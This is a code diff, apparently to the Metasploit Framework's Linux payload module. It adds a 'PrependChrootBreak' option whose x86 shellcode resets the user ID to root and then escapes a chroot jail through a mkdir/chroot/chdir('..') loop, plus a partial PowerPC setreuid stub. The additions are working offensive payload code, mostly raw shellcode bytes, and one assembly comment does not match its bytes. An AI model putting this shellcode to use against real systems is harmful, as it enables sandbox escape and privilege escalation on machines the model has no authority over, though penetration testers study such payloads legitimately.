@@ -39,6 +39,13 @@ module Msf::Payload::Linux
 						"false"
 					]
 				),
+				Msf::OptBool.new('PrependChrootBreak',
+					[
+						false,
+						"Prepend a stub that will break out of a chroot (includes setreuid to root)",
+						"false"
+					]
+				),
 				Msf::OptBool.new('AppendExit',
 					[
 						false,
@@ -94,6 +101,44 @@ module Msf::Payload::Linux
 				       "\xcd\x80"              #   int     $0x80                      #
 			end
 
+			if (datastore['PrependChrootBreak'])
+				# setreuid(0, 0)
+				pre << "\x31\xc9"             +#   xorl    %ecx,%ecx                  #
+				       "\x31\xdb"             +#   xorl    %ebx,%ebx                  #
+				       "\x6a\x46"             +#   pushl   $0x46                      #
+				       "\x58"                 +#   popl    %eax                       #
+				       "\xcd\x80"              #   int     $0x80                      #
+						 
+				# break chroot
+				pre << "\x6a\x3d"             +#   pushl  $0x3d                       #
+						 # build dir str (ptr in ebx)
+						 "\x89\xe3"             +#   movl   %esp,%ebx                   #
+						 # mkdir(dir)
+						 "\x6a\x27"             +#   pushl  $0x27                       #
+						 "\x58"                 +#   popl   %eax                        #
+						 "\xcd\x80"             +#   int     $0x80                      #
+						 # chroot(dir)
+						 "\x89\xd9"             +#   movl   %ebx,%ecx                   #
+						 "\x58"                 +#   popl   %eax                        #
+						 "\xcd\x80"             +#   int     $0x80                      #
+						 # build ".." str (ptr in ebx)
+						 "\x31\xc0"             +#   xorl   %eax,%eax                   #
+						 "\x50"                 +#   pushl  %eax                        #
+						 "\x66\x68\x2e\x2e"     +#   pushw  $0x2e2e                     #
+						 "\x89\xe3"             +#   movl   %esp,%ebx                   #
+						 # loop changing dir
+						 "\x6a\x3d"             +#   pushl  $0x1e                       #
+						 "\x59"                 +#   popl   %ecx                        #
+						 "\xb0\x0c"             +#   movb   $0xc,%al                    #
+						 "\xcd\x80"             +#   int     $0x80                      #
+						 "\xe2\xfa"             +#   loop   -6                          #
+						 # final chroot
+						 "\x6a\x3d"             +#   pushl  $0x3d                       #
+						 "\x89\xd9"             +#   movl   %ebx,%ecx                   #
+						 "\x58"                 +#   popl   %eax                        #
+						 "\xcd\x80"              #   int     $0x80                      #
+			end
+			
 			# Append
 
 			if (datastore['AppendExit'])
@@ -136,6 +181,17 @@ module Msf::Payload::Linux
 				       "\x7c\x63\x1a\x78"     +#   xor     r3,r3,r3                   #
 				       "\x38\x1f\xfe\x18"     +#   addi    r0,r31,-488                #
 				       "\x44\xff\xff\x02"      #   sc                                 #
+			end
+
+			if (datastore['PrependChrootBreak'])
+				# setreuid(0, 0)
+				pre << "\x3b\xe0\x01\xff"     +#   li      r31,511                    #
+				       "\x7c\x84\x22\x78"     +#   xor     r4,r4,r4                   #
+				       "\x7c\x63\x1a\x78"     +#   xor     r3,r3,r3                   #
+				       "\x38\x1f\xfe\x47"     +#   addi    r0,r31,-441                #
+				       "\x44\xff\xff\x02"      #   sc                                 #
+				
+				# EEK! unsupported...
 			end
 
 			# Append
